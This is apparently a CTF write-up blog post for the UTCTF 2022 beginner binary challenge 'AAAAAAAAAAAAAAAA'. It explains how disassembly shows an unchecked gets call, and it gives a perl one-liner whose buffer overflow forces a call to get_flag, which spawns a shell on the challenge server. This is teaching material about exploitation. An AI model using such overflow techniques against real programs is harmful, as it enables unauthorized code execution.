---
layout: post
title: "[UTCTF 2022] AAAAAAAAAAAAAAAA"
author: frehlid
---

# AAAAAAAAAAAAAAAA

## Problem description
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This creatively named beginner challenge provides us with two pieces of information. A binary, and a server that the program is running on.  In this writeup, we are going to explore how a beginner might approach this problem, reasoning with the information given to find the flag.

Downloading the binary file, we can examine its contents to determine that its an x86 ELF executable for linux machines. 

```cpp
$file AAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6a09f0a7e6d7e792e905fdaaf1561dfbc61d3708, for GNU/Linux 3.2.0, not stripped
```

By using objdump, we can examine the contents of the binary. Objdump is a tool that come preinstalled on UNIX systems, making it an ideal choice for beginners looking to explore some binaries. 

Inside the output, there’s a lot of information. Mostly, it consists of c-library functions and other information. However, there are two functions that might stand out to someone looking to solve this challenge: main, and get_flag.

```cpp
0000000000401156 <main>:
  401156:	f3 0f 1e fa          	endbr64
  40115a:	55                   	push   %rbp
  40115b:	48 89 e5             	mov    %rsp,%rbp
  40115e:	48 83 ec 70          	sub    $0x70,%rsp
  401162:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
  401166:	48 8d 45 90          	lea    -0x70(%rbp),%rax
  40116a:	48 89 c7             	mov    %rax,%rdi
  40116d:	b8 00 00 00 00       	mov    $0x0,%eax
  401172:	e8 e9 fe ff ff       	call   401060 <gets@plt>
  401177:	80 7d ff 42          	cmpb   $0x42,-0x1(%rbp)
  40117b:	75 0a                	jne    401187 <main+0x31>
  40117d:	b8 00 00 00 00       	mov    $0x0,%eax
  401182:	e8 07 00 00 00       	call   40118e <get_flag>
  401187:	b8 00 00 00 00       	mov    $0x0,%eax
  40118c:	c9                   	leave
  40118d:	c3                   	ret

000000000040118e <get_flag>:
  40118e:	f3 0f 1e fa          	endbr64
  401192:	55                   	push   %rbp
  401193:	48 89 e5             	mov    %rsp,%rbp
  401196:	48 83 ec 10          	sub    $0x10,%rsp
  40119a:	48 8d 05 63 0e 00 00 	lea    0xe63(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  4011a1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4011a5:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  4011ac:	00
  4011ad:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4011b1:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
  4011b5:	ba 00 00 00 00       	mov    $0x0,%edx
  4011ba:	48 89 ce             	mov    %rcx,%rsi
  4011bd:	48 89 c7             	mov    %rax,%rdi
  4011c0:	e8 8b fe ff ff       	call   401050 <execve@plt>
  4011c5:	90                   	nop
  4011c6:	c9                   	leave
  4011c7:	c3                   	ret
  4011c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4011cf:	00
```

With a little bit of intuition, it’s obvious that we’re going to want to try and call the function get_flag. Examining the assembly code for this function reveals a syscall, confirming these suspicions. 

```cpp
4011c0:	e8 8b fe ff ff       	call   401050 <execve@plt>
```

Thus, if we can call get_flag, the system will execute the syscall, allowing us to access the flag. With that in mind, how can we call get_flag?

Conveniently, main includes a call to this function! However, it gets jumped over in the program’s normal execution

```cpp
401177:	80 7d ff 42          	cmpb   $0x42,-0x1(%rbp)
40117b:	75 0a                	jne    401187 <main+0x31>
40117d:	b8 00 00 00 00       	mov    $0x0,%eax
401182:	e8 07 00 00 00       	call   40118e <get_flag>
```

The above lines in main represent code that compares the value 1 off of the base of the stack frame with the value 0x42. If the at -0x1(rbp) is not equal to 0x42, we jump to <main+0x31>, skipping the call to get flag. At this point, one might devise a new goal — set -0x1(rbp), and in doing so, successfully make a call to get_flag.

```cpp
  401166:	48 8d 45 90          	lea    -0x70(%rbp),%rax
  40116a:	48 89 c7             	mov    %rax,%rdi
  40116d:	b8 00 00 00 00       	mov    $0x0,%eax
  401172:	e8 e9 fe ff ff       	call   401060 <gets@plt>
```

Just before get flag, we see that there’s a call to gets, a commonly known vulnerable C-function. Gets, as a function, is vulnerable because it does not check if the size of its input fits within the bounds of its output buffer. Hence, a malicious user can utilize gets to overflow a memory buffer, taking control of the program.

With all of this in mind, the exploit in this challenge becomes quite clear; overflow the buffer passed to gets so that it writes 0x42 at -0x1(rbp). Doing so will mean that we fail the jne call in main, successfully calling get_flag! 

Generating the attack string is also pretty easy. In ASCII, the letter ‘B’ has hexadecimal value 0x42. Using perl, we can quickly generate a string containing the character ‘B’ 0x70 times. Since the beginning of main allocates 0x70 bytes onto the stack, if we fill the entire thing with the char B, we’re guaranteed to overwrite the value of -0x1(rbp).

```cpp
perl -e 'print "B" x 0x70' > exploit.txt
```

Finally, if we hop into gdb and run our program with exploit.txt we can see that the overflow is successful, and we are able to make our call to get_flag. 

![gdboutput](/assets/images/utctf2022/AAAAAAAAAAAAAAAA/gdboutput.png)

When running this exploit on the given server, we receive an interactive shell, where we find our flag!